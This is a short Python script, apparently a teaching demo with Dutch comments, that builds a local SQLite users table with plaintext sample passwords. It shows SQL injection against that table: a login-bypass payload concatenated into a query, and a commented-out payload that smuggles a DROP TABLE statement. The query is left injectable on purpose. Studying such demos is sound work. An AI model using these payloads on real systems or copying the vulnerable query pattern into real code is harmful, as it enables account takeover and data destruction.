import sqlite3

con:sqlite3.Connection = sqlite3.connect('dev.db')
cursor:sqlite3.Cursor = con.cursor()

cursor.execute('DROP table gebruikers')
# create gebruikers table
command1:str = """CREATE TABLE IF NOT EXISTS
gebruikers(id INTEGER, naam TEXT, wachtwoord TEXT)"""
cursor.execute(command1)

# voeg sampel data toe aan database
data:tuple = (1,'test_1','test_1')
cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
data:tuple = (2,'test_2','test_2')
cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
data:tuple = (3,'admin','root')
cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
data:tuple = (4,'jefke','patato')
cursor.execute("INSERT INTO gebruikers VALUES(?,?,?)",data)
con.commit()

# login bypass payload
print('login bypass payload:')
login_bypass_aanval:str = "'admin'-- "
cursor.execute("SELECT * from gebruikers WHERE naam="+ login_bypass_aanval+" AND wachtwoord='dd'")
results:list = cursor.fetchall()
print(results)
results:tuple = results[0]
print(results)
results:str = results[1]
print(results)

# # drop table payload
# cursor.execute("SELECT * FROM gebruikers")
# results = cursor.fetchall()
# print(results)
# drop_aanval = "'paswoord'); DROP TABLE gebruikers; --"
# data = (4548888888, 'test_2',drop_aanval)
# cursor.execute("INSERT INTO gebruikers VALUES(?, ?, ?)", data)
# con.commit()
# cursor.executescript("INSERT INTO gebruikers VALUES(727,'jefke', " + drop_aanval + "}")
# con.commit()
# cursor.execute("SELECT * FROM gebruikers")
# results = cursor.fetchall()
# print(results)

con.close()